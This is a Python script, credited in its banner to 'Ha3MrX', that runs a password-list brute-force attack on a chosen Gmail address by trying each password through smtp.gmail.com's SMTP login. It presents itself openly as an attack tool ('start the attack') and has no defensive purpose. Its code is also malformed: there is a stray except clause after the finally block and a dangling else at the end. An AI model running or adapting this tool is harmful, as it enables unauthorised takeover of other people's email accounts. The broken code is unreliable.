#!/usr/bin/python
import smtplib
from os import system
import sys

def main_banner():
    print('=================================================')
    print('               create by Ha3MrX                  ')
    print('=================================================')
    print('               ++++++++++++++++++++              ')
    print('\n                                                ')
    print('  _,.                                            ')
    print('                                                 ')
    print('                                                 ')
    print('               HA3MrX                            ')
    print('        _,.                   ')
    print('      ,` -.)                  ')
    print('     ( _/-\\-._               ')
    print('    /,|`--._,-^|            , ')
    print('    \_| |`-._/||          , | ')
    print('      |  `-, / |          /  / ')
    print('      |     || |         /  /  ')
    print('       `r-._||/   __    /  /   ')
    print('   __,-<_     )`-/  `./  /     ')
    print('   \   `---    \   / /  /      ')
    print('      |           |./  /       ')
    print('      /           //  /        ')
    print('  \_/  \          |/  /         ')
    print('   |    |    _,^- /  /          ')
    print('   |    , ``  (\/  /_          ')
    print('    \,.->._    \X-=/^          ')
    print('    (  /    `-._//^`            ')
    print('     `Y-.____(__}              ')
    print('      |     {__)               ')
    print('            ()    V.1.0        ')

def login():
    main_banner()
    print('[1] start the attack')
    print('[2] exit')
    
    option = input('==>')
    
    if option != '1':
        system('clear')
        sys.exit()
    
    file_path = input('path of passwords file : ')
    user_name = input('target email : ')
    
    # Use context managers for file handling
    try:
        with open(file_path, 'r', encoding='utf-8') as pass_file:
            pass_list = pass_file.readlines()
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")
        return
    
    # Separate the attack logic into its own function
    attempt_login(user_name, pass_list)

def attempt_login(user_name, pass_list):
    """Attempt login with password list."""
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        
        for i, password in enumerate(pass_list, 1):
            password = password.strip()
            print(f"{i}/{len(pass_list)} | Testing: {password}")
            
            try:
                server.login(user_name, password)
                system('clear')
                main_banner()
                print(f'[+] Success! Password found: {password}')
                break
            except smtplib.SMTPAuthenticationError as e:
                if any(block in str(e) for block in ["Application-specific", "AcceptHelp"]):
                    print(f'[+] Potential password found: {password} (Security block detected)')
                    break
    except Exception as e:
        print(f"[!] Connection error: {e}")
    finally:
        server.quit()
        except Exception as e:
            print(f"[!] Connection error: {e}")
            
    else:
        system('clear')
        sys.exit()

if __name__ == "__main__":
    login()
